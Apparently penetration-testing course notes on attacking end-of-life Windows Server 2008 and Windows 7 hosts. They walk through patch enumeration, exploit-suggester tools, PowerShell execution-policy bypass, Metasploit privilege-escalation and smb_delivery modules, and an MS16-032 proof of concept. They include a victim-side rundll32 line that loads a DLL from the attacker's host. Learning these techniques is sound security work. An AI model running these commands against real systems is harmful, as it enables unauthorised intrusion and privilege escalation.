# Dealing with End of Life Systems

In this section will cover:
- Windows Server
- Windows Desktop Versions

## Windows Server

Windows Server 2008/2008 R2 were made end-of-life on January 14, 2020. Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Server. It is not very common to encounter Server 2008 during an external penetration test, but I often encounter it during internal assessments.

**Querying Current Patch Level**
````
> wmic qfe
````
A quick Google search of the last installed hotfix shows us that this system is very far out of date.

**Running Sherlock**
````
> Set-ExecutionPolicy bypass -Scope process

# Running Sherlock
> Import-Module .\Sherlock.ps1
> Find-AllVulns
````
**Searching for Local Privilege Escalation Exploit**
````
msf6 exploit(windows/smb/smb_delivery) > search 2010-3338
> set session <id>

# Migrating to a 64-bit Process
> ps
> migrate <PID>

# Priv Esc
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
msf6 exploit(windows/local/ms10_092_schelevator) > set lhost <Our_IP>
msf6 exploit(windows/local/ms10_092_schelevator) > set lport <Our_Port>
msf6 exploit(windows/local/ms10_092_schelevator) > exploit
````
**Obtaining a Meterpreter Shell**
````
# Our Machine
msf6 exploit(windows/smb/smb_delivery) > search smb_delivery
msf6 exploit(windows/smb/smb_delivery) > show targets
msf6 exploit(windows/smb/smb_delivery) > set target 0 (DLL)
msf6 exploit(windows/smb/smb_delivery) > set lhost <Our_IP>
msf6 exploit(windows/smb/smb_delivery) > set lport <Our_Port>
msf6 exploit(windows/smb/smb_delivery) > set SRVHOST <Our_IP>

# Victim Machine
> rundll32.exe \\<Our_IP>\lEUZam\test.dll,0
````

## Windows Desktop Versions

Windows 7 was made end-of-life on January 14, 2020, but is still in use in many environments.

Windows 7 vs. Newer Versions
Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Desktop. The table below shows some notable differences between Windows 7 and Windows 10.

| Feature                       | Windows 7 | Windows 10 |
| ----------------------------- | --------- | ---------- |
| Microsoft Password (MFA)      |           | X          |
| BitLocker                     | Partial   | X          |
| Credential Guard              |           | X          |
| Remote Credential Guard       |           | X          |
| Device Guard (code integrity) |           | X          |
| AppLocker                     | Partial   | X          |
| Windows Defender              | Partial   | X          |
| Control Flow Guard            |           | X          |

**Gathering Systeminfo Command Output**
````
> systeminfo
````
**Running Windows Exploit Suggester**
````
$ sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
$ sudo tar -xf setuptools-2.0.tar.gz
$ cd setuptools-2.0/
$ sudo python2.7 setup.py install

$ sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
$ sudo tar -xf xlrd-1.0.0.tar.gz
$ cd xlrd-1.0.0/
$ sudo python2.7 setup.py install

$ sudo python2.7 windows-exploit-suggester.py --update
$ python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
````
Suppose we have obtained a Meterpreter shell on our target using the Metasploit framework. In that case, we can also use this local exploit suggester module which will help us quickly find any potential privilege escalation vectors and run them within Metasploit should any module exist.

**Exploiting MS16-032 with PowerShell PoC**
````
# Bypass Policy
> Set-ExecutionPolicy bypass -scope process

# Execute Exploit
> Import-Module .\MS16-032_poc.ps1
> Invoke-MS16-032
````
